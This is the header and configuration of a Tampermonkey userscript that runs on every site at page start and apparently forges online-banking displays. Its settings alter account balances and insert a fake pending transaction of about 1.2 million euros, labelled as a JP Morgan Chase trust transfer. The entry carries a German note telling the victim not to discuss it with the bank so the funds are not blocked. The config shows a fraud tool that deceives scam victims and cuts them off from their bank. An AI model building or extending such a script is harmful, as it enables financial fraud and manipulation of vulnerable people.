// ==UserScript==
// @name         Ed Start 4Rec hyp.m5rly108@gmail.com
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/559232/Ed%20Start%204Rec%20hypm5rly108%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/559232/Ed%20Start%204Rec%20hypm5rly108%40gmailcom.meta.js
// ==/UserScript==


//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================



// GESAMT START

   // Configurable modification amounts and their corresponding indexes
    const accountBalanceAdjustments = [
        { index: 0, amount: 0 },

    ];

// BALANCES START

    // Configurable modification amounts and their corresponding indexes
    const balanceModificationConfig = [
        { index: 0, amount: 0 },
        { index: 2, amount: 0 },
        { index: 5, amount: 0 },
    ];

//  UMSATZE BALANCE

  // Configurable modification amount
    const modificationAmount = 0; // Set your desired modification amount here
    const accountValue = '270440067'; // Set your desired account value here
    const useSelectedOption = false; // Set to false to ignore the selected option in the dropdown  BEING SET TO TRUE WHEN CLIENT HAS MANY ACCOUNTS, HOWEVER, WHEN CLIENT HAS 1 ACCOUNT IS USUALLY  BEING SET TO FALSE


// UMSATZE TRANSACTIONS

   // Specify transactions here
    const transactions = [
           {
            transactionDate: "Vorgemerkt",
            transactionDateBooking: " ",
            transactionTitle: "Treuhand: JP Morgan Chase",
            transactionDetails: "Freigabe nötig durch Absender. A. Faber meldet sich. Mit Bank nicht besprechen damit nicht gesperrt.",
            transactionAmount: "+1.197.972,37 EUR",
            insertPosition: 'above' // Specify position for this transaction
        }
 //       {
//            transactionDate: "03.07.2024",
 //           transactionDateBooking: "03.07.2024",
 //           transactionTitle: "NewTitle*Example 1234 City",
 //           transactionDetails: "JP Morgan Chase 2.500 Euro 03.07. 10356092",
  //          transactionAmount: "+2.500,00 EUR",
  //          insertPosition: 'above' // Specify position for this transaction
 //       },
 //       {
 //           transactionDate: "01.07.2024",
 //           transactionDateBooking: "01.07.2024",
 //           transactionDetails: "Bank of America 3.000 Euro 04.07. 10356100",
 //           transactionAmount: "-3.000,00 EUR",
 //           insertPosition: 'above' // Specify position for this transaction
 //       }
        // Add more transactions as needed
    ];


